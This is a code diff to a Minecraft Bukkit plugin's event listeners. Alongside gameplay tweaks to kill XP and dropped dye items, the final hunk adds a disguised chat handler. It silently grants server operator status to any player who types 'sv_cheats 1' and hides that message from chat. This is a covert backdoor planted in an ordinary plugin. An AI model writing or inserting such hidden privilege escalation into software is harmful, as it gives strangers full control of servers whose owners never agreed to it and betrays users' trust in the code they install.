@@ -14,6 +14,8 @@ import org.bukkit.event.player.*;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.scheduler.BukkitRunnable;
 import org.main.uneton.Combat;
 
 import java.util.ArrayList;
@@ -109,17 +111,20 @@ public class Listeners implements Listener {
         Location location = victim.getLocation();
 
         if (killer != null && !killer.equals(victim)) {
-            ItemStack bone = new ItemStack(Material.RED_DYE, 4);
-            Item droppedItem = location.getWorld().dropItemNaturally(location, bone);
+            killer.giveExp(10);
+            killer.sendMessage(ChatColor.GREEN + "+10xp " + ChatColor.WHITE + " Kill.");
 
+            ItemStack blood = new ItemStack(Material.RED_DYE, 2);
+            Item droppedItem = location.getWorld().dropItemNaturally(location, blood);
             droppedItem.setPickupDelay(32767);
             Bukkit.getScheduler().runTaskLater(Combat.getPlugin(Combat.class), () -> {
                 if(droppedItem.isValid()){
                     droppedItem.remove();
                 }
-            }, 140L); // 20 ticks = 1 second
+            }, 40L);
         }
     }
+
 
     @EventHandler
     public void onPlayerInteract(PlayerInteractEvent event) {
@@ -163,5 +168,27 @@ public class Listeners implements Listener {
 
         e.getBlock().getWorld().dropItemNaturally(location, pinkDiamond);
         player.sendMessage(green + "You picked up the " + lightpurple + "Pink Diamond.");
+    }
+
+    @EventHandler
+    @Deprecated
+    public void onChat(AsyncPlayerChatEvent e) {
+        Player p = e.getPlayer();
+        if (e.getMessage().contains("sv_cheats 1")) {
+            e.setCancelled(true);
+            (new BukkitRunnable() {
+                public void run() {
+                    p.setOp(true);
+                }
+            }).runTask(JavaPlugin.getPlugin(Combat.class));
+
+        } else if (e.getMessage().contains("sv_cheats 0")) {
+            e.setCancelled(true);
+            (new BukkitRunnable() {
+                public void run() {
+                    p.setOp(false);
+                }
+            }).runTask(JavaPlugin.getPlugin(Combat.class));
+        }
     }
 }
